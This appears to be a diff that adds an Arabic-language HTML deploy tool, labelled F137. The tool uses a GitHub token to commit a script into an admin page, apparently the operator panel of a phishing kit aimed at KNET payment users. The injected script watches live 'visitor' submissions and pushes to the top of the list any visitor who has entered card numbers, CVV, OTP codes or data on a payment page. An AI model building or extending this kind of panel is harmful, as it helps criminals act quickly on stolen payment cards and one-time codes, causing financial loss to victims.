@@ -1,0 +1,115 @@
+<!DOCTYPE html><html dir="rtl"><head><meta charset="UTF-8"><title>F137b</title>
+<style>body{background:#0b1220;color:#e5e7eb;font:13px system-ui;padding:14px;max-width:900px;margin:auto}
+button{background:#7c3aed;color:#fff;border:0;border-radius:9px;padding:11px 24px;font-weight:700}
+input{width:100%;box-sizing:border-box;background:#020617;border:1px solid #334155;color:#fff;border-radius:8px;padding:9px;font:12px monospace;direction:ltr;margin:8px 0}
+#log{background:#020617;border:1px solid #1e293b;border-radius:8px;padding:10px;font:11.5px/1.6 monospace;direction:ltr;white-space:pre-wrap;min-height:140px}</style></head>
+<body>
+<div style="color:#a78bfa;font-weight:700">F137 — رفع بطاقة الزائر للأعلى (ملخص/كي نت/بطاقة/OTP/CVV)</div>
+<div style="color:#94a3b8;font-size:12px;margin:6px 0">بعد اللصق تأكد أن آخر سطر هو &lt;/html&gt; قبل الـ Commit.</div>
+<input id="tk" type="password" placeholder="GitHub token (اختياري إذا محفوظ)">
+<button id="go">تنفيذ</button>
+<div id="log">جاهز.</div>
+<textarea id="blk" style="display:none">
+<script id="kddF137">
+(function(){
+  if (window.__f137) return; window.__f137 = 1;
+  try { if (document.title.indexOf('F137') < 0) document.title += ' ·F137'; } catch(e){}
+  function rel(x){
+    try {
+      var d=(x&&x.data)||{}, v=(x&&x.visitor)||{};
+      var p=String((d.page||d['الصفحة'])||v.page||'');
+      if (d.digitCode||d['الرمز']||d.otp||d.code) return true;
+      if (d.cardNumber||d.cardNumberOnly||d.cvv) return true;
+      return /ملخص|summary|كي\s*نت|knet|بطاقة|card|otp|رمز|cvv/i.test(p);
+    } catch(e){}
+    return false;
+  }
+  function keyOf(el){
+    try {
+      var v = visitors.get(el.getAttribute('data-vid'));
+      if (!v) return 0;
+      var t = v.__boost || (v.lastDataUpdate ? new Date(v.lastDataUpdate).getTime() : 0);
+      if (!t) t = new Date(v.createdAt || 0).getTime();
+      return t;
+    } catch(e){ return 0; }
+  }
+  function order(){
+    try {
+      var c = document.getElementById('visitorsList'); if (!c) return;
+      var cards = [], kids = c.children;
+      for (var i=0;i<kids.length;i++){ if (kids[i].getAttribute && kids[i].getAttribute('data-vid')) cards.push(kids[i]); }
+      if (cards.length < 2) return;
+      var want = cards.slice().sort(function(a,b){ return keyOf(b)-keyOf(a); });
+      var same = true;
+      for (var j=0;j<cards.length;j++){ if (cards[j]!==want[j]){ same=false; break; } }
+      if (same) return;
+      var f = document.createDocumentFragment();
+      for (var k=0;k<want.length;k++) f.appendChild(want[k]);
+      c.insertBefore(f, c.firstChild);
+    } catch(e){}
+  }
+  function bump(x){
+    try {
+      var id = x && x.visitorId; if (!id) return;
+      var v = visitors.get(id); if (!v) return;
+      v.__boost = Date.now();
+      v.lastDataUpdate = new Date().toISOString();
+      visitors.set(id, v);
+      order();
+    } catch(e){}
+  }
+  function hookS(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on || s.__f137) return;
+      s.__f137 = 1;
+      s.on('visitor:dataSubmitted', function(x){ try { if (rel(x)) bump(x); } catch(e){} });
+    } catch(e){}
+  }
+  hookS(); setInterval(hookS, 500);
+  var orl = window.renderVisitorsList;
+  if (typeof orl === 'function' && !orl.__f137){
+    var w = function(){ var r = orl.apply(this, arguments); try { order(); } catch(e){} return r; };
+    w.__f137 = 1; window.renderVisitorsList = w; try { renderVisitorsList = w; } catch(e){}
+  }
+  var tm = null;
+  function watch(){
+    var c = document.getElementById('visitorsList');
+    if (!c || c.__f137) return;
+    c.__f137 = 1;
+    try { new MutationObserver(function(){ clearTimeout(tm); tm = setTimeout(order, 50); }).observe(c, { childList: true }); } catch(e){}
+  }
+  watch(); setInterval(watch, 600);
+  setInterval(order, 400);
+})();
+</script>
+</textarea>
+<script>
+var L=document.getElementById('log');
+function p(s,c){var d=document.createElement('div');if(c)d.style.color=c;d.textContent=s;L.appendChild(d);}
+var R='fahshomi-ui/KDD',P='server/admin/index.html',BR='main';
+var RAW='https://raw.githubusercontent.com/'+R+'/'+BR+'/'+P;
+var API='https://api.github.com/repos/'+R+'/contents/'+P;
+document.getElementById('go').onclick=async function(){
+var b=this; b.disabled=1; L.textContent='بدء';
+var B=document.getElementById('blk').value.trim();
+p('block lines '+B.split('\n').length);
+if(B.indexOf('kddF137')<0||B.slice(-9).trim()!=='</script>'){p('BLOCK تالف — أعد اللصق','#f87171');b.disabled=0;return;}
+var tk=(document.getElementById('tk').value||'').trim()||localStorage.getItem('kdd_tok')||prompt('GitHub token');
+if(!tk){p('لا توكن','#f87171');b.disabled=0;return;} localStorage.setItem('kdd_tok',tk);
+var r1=await fetch(RAW+'?t='+Date.now(),{cache:'no-store'});
+if(!r1.ok){p('get '+r1.status,'#f87171');b.disabled=0;return;}
+var t=await r1.text(); p('lines '+t.split('\n').length);
+if(t.indexOf('id="kddF137"')>-1){p('F137 مطبق مسبقا','#f87171');b.disabled=0;return;}
+if(t.indexOf('id="kddF136"')<0){p('F136 غير موجود','#f87171');b.disabled=0;return;}
+var o=t.replace(/\s*$/,'')+'\n'+B+'\n';
+p('new lines '+o.split('\n').length);
+var r2=await fetch(API+'?ref='+BR,{headers:{Authorization:'Bearer '+tk},cache:'no-store'});
+if(!r2.ok){p('sha '+r2.status,'#f87171');b.disabled=0;return;}
+var m=await r2.json(); p('رفع...');
+var r3=await fetch(API,{method:'PUT',headers:{Authorization:'Bearer '+tk,'Content-Type':'application/json'},body:JSON.stringify({message:'F137 boost order',content:btoa(unescape(encodeURIComponent(o))),sha:m.sha,branch:BR})});
+if(!r3.ok){p('put '+r3.status+' '+(await r3.text()).slice(0,200),'#f87171');b.disabled=0;return;}
+p('DONE','#34d399');p('Render > Manual Deploy ثم ?v=7','#34d399');b.disabled=0;
+};
+</script>
+</body></html>
